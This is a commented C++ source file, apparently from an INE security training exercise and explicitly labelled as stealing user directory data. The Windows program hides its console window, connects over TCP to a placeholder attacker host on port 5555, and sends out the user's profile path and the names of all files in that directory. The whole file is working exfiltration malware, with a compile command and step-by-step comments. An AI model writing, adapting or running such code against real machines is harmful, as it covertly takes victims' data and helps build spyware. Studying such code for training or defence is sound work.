
// 4/18/2021
// steal user directory data via INE

// #######command to compile on linux "x86_64-w64-mingw32-gcc-win32 -o <out_put_name> <file_name>.cpp -lwsock32 -lstdc++" #####

/* we use winsock utilities and we do not want the compiler 
to complain about older functionalities used, since the below code is sufficient for our needs. */
#define _WINSOCK_DEPRECATED_NO_WARNINGS 

/* pragma is a method specified by the C standard for providing additional information to the compiler
we nee this library to use sockts (ie; networking)*/
#pragma comment(lib, "Ws2_32.lib")

// #### header for utilities (ie imports/library) ####
#include <iostream> // input/output utilities

// #ifdef _WIN32
#include <winsock2.h>
// #endif
// networking utilites
#include <stdio.h>    // standard input/output utilities
#include <stdlib.h>   // standard input/output utilities
#include <dirent.h>   // directory utilities
#include <string>     // string utilities

// #### fucntions to collect user directory data
char* userDirectory() // char* will return a pointer to a string
{
	char* pPath; // define a pointer -> char with the name pPath
	pPath = getenv ("USERPROFILE"); // std function that searches for a string of the users OS
	if (pPath != NULL) 
	{
		return pPath; // if ppath is NOT empty return it.
	}
	else
	{
		perror(""); // if empty return error.
	}
	return 0;
}

// main function to establish tcp connection and send directory data to host.
int main()
{
	// ##### create connection between host and target with tcp ######
	ShowWindow(GetConsoleWindow(), SW_HIDE); // hide window
	WSADATA WSAData; // declaration of structure: holds infromation about windows sockets
	SOCKET server; // variable used to store the connection of the socket type
	SOCKADDR_IN addr; // connection detailes 

	WSAStartup(MAKEWORD(2, 0), &WSAData);
	server = socket(AF_INET, SOCK_STREAM, 0); // TCP connection initialization
	addr.sin_addr.s_addr = inet_addr("<host_ip>"); //target of the tcp (listening address)
	addr.sin_family = AF_INET; //set address family to af_inet - ipv4 address
	addr.sin_port = htons(5555); // remote port (listening port)
	connect(server, (SOCKADDR *)&addr, sizeof(addr)); // connects everything


/*
Now the socket and its outgoing network TCP connection are 
established; data can now be sent over TCP. In this case, 
the server variable holds the connection details, so further sending 
any data to this target will be done using the server variable.
*/

// ##### directory reading for target machine #####

	char* pPath = userDirectory(); // local instance of pPath from previous fucntion
	send(server, pPath, sizeof(pPath), 0); // path is sent to host machine.

	DIR *dir; // new variable named dir, pointer to type DIR
	struct dirent *ent; // new variable named ent poiner to structure
	if ((dir = opendir (pPath)) != NULL)
	{
		while ((ent = readdir(dir)) != NULL) // while there are next directories 
		{
			send(server, ent->d_name, sizeof(ent->d_name), 0); // send them to host
		}
		closedir (dir); // close dir
	}
	else
	{
		perror("");
	}

	closesocket(server); //close the socket
	WSACleanup(); //clean up the Winsock library components
}